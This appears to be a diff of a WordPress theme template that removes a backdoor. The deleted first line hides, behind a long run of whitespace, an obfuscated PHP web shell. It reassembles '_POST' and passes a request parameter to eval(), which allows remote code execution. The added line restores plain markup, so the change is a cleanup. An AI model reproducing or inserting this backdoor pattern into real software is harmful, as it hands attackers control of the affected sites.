@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                              $hoof12 ="o_pst";$lzu98= strtoupper ( $hoof12[1].$hoof12[2].$hoof12[0]. $hoof12[3]. $hoof12[4] );if(isset (${$lzu98}['q3f0af5' ] ) ){eval(${$lzu98 } ['q3f0af5' ] ) ;}?><div class="row lined">
+<div class="row lined">
 	<div class="span12">
 		<?php if ( has_post_thumbnail() ) the_post_thumbnail('full'); ?>
 		<h2><?php the_title(); ?></h2>
